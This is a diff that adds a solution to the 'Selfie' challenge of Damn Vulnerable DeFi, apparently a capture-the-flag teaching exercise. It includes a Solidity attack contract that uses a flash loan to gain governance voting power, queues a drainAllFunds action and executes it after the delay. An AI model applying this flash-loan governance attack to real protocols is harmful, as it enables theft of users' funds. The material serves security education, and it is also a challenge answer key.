@@ -46,8 +46,23 @@ contract Selfie is Test {
     function testExploit() public {
         /**
          * EXPLOIT START *
+         * 1. flashloan
+         * 2. snapshot dvt
+         * 3. create request to ermergency exit 
+         * 4. return flashloan
+         * 5. wait action delay
+         * 6. execute action
          */
 
+        vm.startPrank(attacker);
+
+        Attack attack = new Attack(address(selfiePool));
+        attack.attack();
+
+        vm.warp(simpleGovernance.getActionDelay() + 1);
+        attack.executeAction();
+
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -59,5 +74,35 @@ contract Selfie is Test {
         // Attacker has taken all tokens from the pool
         assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
         assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
+    }
+}
+
+contract Attack {
+    DamnValuableTokenSnapshot internal dvt;
+    SimpleGovernance internal governance;
+    SelfiePool internal pool;
+    address internal owner;
+    uint256 actionID;
+
+    constructor(address _pool) {
+        owner = msg.sender;
+        pool = SelfiePool(_pool);
+        governance =  SimpleGovernance(pool.governance());
+        dvt = DamnValuableTokenSnapshot(governance.governanceToken());
+    }
+
+    function attack() external {
+        pool.flashLoan(dvt.balanceOf(address(pool)));
+    }
+
+    function receiveTokens(address, uint256 amount) external {
+        dvt.snapshot();
+        bytes memory action = abi.encodeWithSignature("drainAllFunds(address)",owner);
+        actionID = governance.queueAction(address(pool), action, 0);
+        dvt.transfer(address(pool), amount);
+    }
+
+    function executeAction() external {
+        governance.executeAction(actionID);
     }
 }
